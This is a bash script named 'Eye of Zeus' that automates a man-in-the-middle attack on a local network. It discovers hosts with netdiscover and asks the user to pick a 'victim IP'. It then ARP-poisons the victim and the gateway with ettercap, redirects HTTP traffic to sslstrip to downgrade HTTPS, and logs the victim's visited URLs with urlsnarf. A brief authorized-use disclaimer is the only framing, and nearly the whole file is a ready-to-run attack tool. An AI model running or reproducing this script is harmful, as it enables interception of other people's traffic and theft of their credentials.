#!/bin/bash

# Define color variables for consistency
RED="\e[1;31m"
RESET="\e[0m"

# Eye_Of_Zeus Banner with Cool Colors
echo -e "\e[1;36m"
echo " ██████████                                  ███████       ██████            ███████████                            "
echo "░░███░░░░░█                                ███░░░░░███    ███░░███          ░█░░░░░░███                             "
echo " ░███  █ ░  █████ ████  ██████            ███     ░░███  ░███ ░░░           ░     ███░    ██████  █████ ████  █████ "
echo " ░██████   ░░███ ░███  ███░░███          ░███      ░███ ███████                  ███     ███░░███░░███ ░███  ███░░  "
echo " ░███░░█    ░███ ░███ ░███████           ░███      ░███ ░░░███░                 ███     ░███████  ░███ ░███ ░░█████ "
echo " ░███ ░   █ ░███ ░███ ░███░░░            ░░███     ███    ░███                ████     █░███░░░   ░███ ░███  ░░░░███"
echo " ██████████ ░░███████ ░░██████  █████████ ░░░███████░     █████     █████████ ███████████░░██████  ░░████████ ██████ "
echo "░░░░░░░░░░   ░░░░░███  ░░░░░░  ░░░░░░░░░    ░░░░░░░     ░░░░░     ░░░░░░░░░ ░░░░░░░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░░  "
echo "             ███ ░███                                                                                               "
echo "            ░░██████                                                                                                "
echo "             ░░░░░░                                                                                                 "
echo -e "\e[0m"
echo -e "\e[1;36m================================================================================\e[0m"
echo -e "\e[1;36m========================  Author: arch_nexus707  ================================\e[0m"
echo -e "\e[1;36m================================================================================\e[0m"

# Disclaimer
echo -e "${RED}WARNING: This tool is for authorized testing only. Unauthorized use on networks you do not own or have permission to test is illegal.${RESET}"
read -p "Do you understand and agree to use this tool responsibly? (y/N): " agree
if [[ ! "$agree" =~ ^[Yy]$ ]]; then
    echo -e "${RED}You must agree to proceed. Exiting.${RESET}"
    exit 1
fi

# Get the directory where the script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
NETDISCOVER_FILE="$SCRIPT_DIR/netdiscover_output.txt"
LOG_DIR="$SCRIPT_DIR/logs"

# Create log directory with proper permissions
mkdir -p "$LOG_DIR"
chmod 755 "$LOG_DIR"

# Check if running as root (we'll use sudo for specific commands instead)
if [ "$EUID" -eq 0 ]; then
    echo -e "\e[1;31mIt's recommended to run this script as a regular user and use sudo for specific commands.\e[0m"
    echo -e "\e[1;31mPlease run as: $0\e[0m"
    exit 1
fi

# Function to display available interfaces
show_interfaces() {
    echo -e "\e[1;32mAvailable network interfaces:\e[0m"
    interfaces=($(ip link show | grep -E "^[0-9]+: (eth|wlan)" | awk -F: '{print $2}' | tr -d ' '))
    
    for i in "${!interfaces[@]}"; do
        echo -e "\e[1;33m[$((i+1))] ${interfaces[$i]}\e[0m"
    done
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "\e[1;31mNo eth or wlan interfaces found!\e[0m"
        exit 1
    fi
}

# Function to perform network discovery
network_discovery() {
    echo -e "\e[1;32mStarting network discovery on $selected_iface for 60 seconds...\e[0m"
    
    # Run netdiscover in background for 60 seconds
    echo -e "\e[1;33mRunning netdiscover, please wait...\e[0m"
    sudo timeout 60 netdiscover -i $selected_iface -P -r ${network_cidr} | sudo tee "$NETDISCOVER_FILE" > /dev/null 2>&1
    
    # Check if netdiscover output file was created
    if [ ! -f "$NETDISCOVER_FILE" ]; then
        echo -e "\e[1;31mError: netdiscover output file not found at $NETDISCOVER_FILE\e[0m"
        exit 1
    fi
    
    # Change ownership of the file to the current user
    sudo chown $(id -u):$(id -g) "$NETDISCOVER_FILE"
    
    # Extract discovered IPs
    discovered_ips=($(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$NETDISCOVER_FILE" | sort -u | grep -v "0.0.0.0"))
    
    # Display discovered hosts
    echo -e "\e[1;32mDiscovered hosts on $selected_iface:\e[0m"
    for i in "${!discovered_ips[@]}"; do
        # Try to get MAC address
        mac=$(grep "${discovered_ips[$i]}" "$NETDISCOVER_FILE" | awk '{print $2}' | head -1)
        echo -e "\e[1;33m[$((i+1))] IP: ${discovered_ips[$i]}  MAC: $mac\e[0m"
    done
    
    if [ ${#discovered_ips[@]} -eq 0 ]; then
        echo -e "\e[1;31mNo hosts discovered. Exiting.\e[0m"
        echo -e "\e[1;31mCheck the netdiscover output file at: $NETDISCOVER_FILE\e[0m"
        exit 1
    fi
}

# Function to get gateway IP
get_gateway() {
    gateway_ip=$(ip route | grep default | grep $selected_iface | awk '{print $3}')
    if [ -z "$gateway_ip" ]; then
        echo -e "\e[1;31mCould not determine gateway IP. Please enter it manually:\e[0m"
        read gateway_ip
    else
        echo -e "\e[1;34mDetected gateway: $gateway_ip\e[0m"
    fi
}

# Function to cleanup on exit
cleanup() {
    echo -e "\e[1;31m\nCleaning up...\e[0m"
    sudo iptables -t nat -F
    sudo pkill -f sslstrip
    sudo pkill -f ettercap
    sudo pkill -f urlsnarf
    echo -e "\e[1;32mCleanup complete. iptables rules flushed and processes terminated.\e[0m"
}

# Set trap to cleanup on script exit
trap cleanup EXIT

# Step 1: Enable IP forwarding
echo -e "\e[1;32mEnabling IP forwarding...\e[0m"
sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
echo -e "\e[1;34mIP forwarding status: $(cat /proc/sys/net/ipv4/ip_forward)\e[0m"
echo ""

# Step 2: Select interface
show_interfaces

echo -e "\e[1;36mPlease select an interface (1-${#interfaces[@]}):\e[0m"
read iface_choice

if [[ ! $iface_choice =~ ^[0-9]+$ ]] || [ $iface_choice -lt 1 ] || [ $iface_choice -gt ${#interfaces[@]} ]; then
    echo -e "\e[1;31mInvalid selection. Exiting.\e[0m"
    exit 1
fi

selected_iface=${interfaces[$((iface_choice-1))]}
echo -e "\e[1;32mSelected interface: $selected_iface\e[0m"

# Get network CIDR for scanning
network_cidr=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
if [ -z "$network_cidr" ]; then
    echo -e "\e[1;31mCould not determine network CIDR. Please enter it manually (e.g., 192.168.1.0/24):\e[0m"
    read network_cidr
fi

# Step 3: Network discovery
network_discovery

# Step 4: Select victim IP
echo -e "\e[1;36mPlease select a victim IP (1-${#discovered_ips[@]}):\e[0m"
read victim_choice

if [[ ! $victim_choice =~ ^[0-9]+$ ]] || [ $victim_choice -lt 1 ] || [ $victim_choice -gt ${#discovered_ips[@]} ]; then
    echo -e "\e[1;31mInvalid selection. Exiting.\e[0m"
    exit 1
fi

victim_ip=${discovered_ips[$((victim_choice-1))]}
echo -e "\e[1;31mSelected victim IP: $victim_ip\e[0m"

# Step 5: Get gateway IP
get_gateway

# Step 6: Set up iptables rule
echo -e "\e[1;32mSetting up iptables rule...\e[0m"
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Step 7: Start sslstrip in background
echo -e "\e[1;32mStarting sslstrip in background...\e[0m"
sudo bash -c "sslstrip -l 8080 > '$LOG_DIR/sslstrip.log' 2>&1" &
SSLSTRIP_PID=$!
echo -e "\e[1;34mSSLStrip running (PID: $SSLSTRIP_PID), logging to $LOG_DIR/sslstrip.log\e[0m"

# Step 8: Start ettercap in background
echo -e "\e[1;32mStarting ettercap in background...\e[0m"
sudo bash -c "ettercap -Tq -M arp:remote -i $selected_iface /$victim_ip// /$gateway_ip// > '$LOG_DIR/ettercap.log' 2>&1" &
ETTERCAP_PID=$!
echo -e "\e[1;34mEttercap running (PID: $ETTERCAP_PID), logging to $LOG_DIR/ettercap.log\e[0m"

# Brief pause to allow ARP poisoning to take effect
sleep 5

# Step 9: Start urlsnarf in background
echo -e "\e[1;32mStarting urlsnarf in background...\e[0m"
sudo bash -c "urlsnarf -i $selected_iface > '$LOG_DIR/urlsnarf.log' 2>&1" &
URLSNARF_PID=$!
echo -e "\e[1;34mURLSnarf running (PID: $URLSNARF_PID), logging to $LOG_DIR/urlsnarf.log\e[0m"

# Change ownership of log files to current user
sudo chown $(id -u):$(id -g) "$LOG_DIR"/*.log 2>/dev/null || true

echo ""
echo -e "\e[1;36m===== Eye of Zeus - Status Dashboard =====\e[0m"
echo -e "\e[1;32mInterface:\e[0m $selected_iface"
echo -e "\e[1;31mVictim IP:\e[0m $victim_ip"
echo -e "\e[1;34mGateway IP:\e[0m $gateway_ip"
echo ""
echo -e "\e[1;32mAll tools have been launched in the background.\e[0m"
echo -e "\e[1;34mNetdiscover output saved to: $NETDISCOVER_FILE\e[0m"
echo -e "\e[1;34mLog files are in: $LOG_DIR/\e[0m"
echo ""
echo -e "\e[1;36mMonitoring logs (press Ctrl+C to stop):\e[0m"
echo -e "\e[1;36m---------------------------------------\e[0m"

# Function to monitor logs
monitor_logs() {
    # Wait a moment for logs to be created
    sleep 2
    # Change ownership of log files again in case they were created after the previous chown
    sudo chown $(id -u):$(id -g) "$LOG_DIR"/*.log 2>/dev/null || true
    
    if [ -f "$LOG_DIR/urlsnarf.log" ]; then
        tail -f "$LOG_DIR/urlsnarf.log" | while read line; do
            echo -e "\e[1;33m[URL] $line\e[0m"
        done
    else
        echo -e "\e[1;31mWarning: URLSnarf log file not found. Monitoring ettercap log instead.\e[0m"
        tail -f "$LOG_DIR/ettercap.log"
    fi
}

# Monitor logs (press Ctrl+C to exit)
monitor_logs
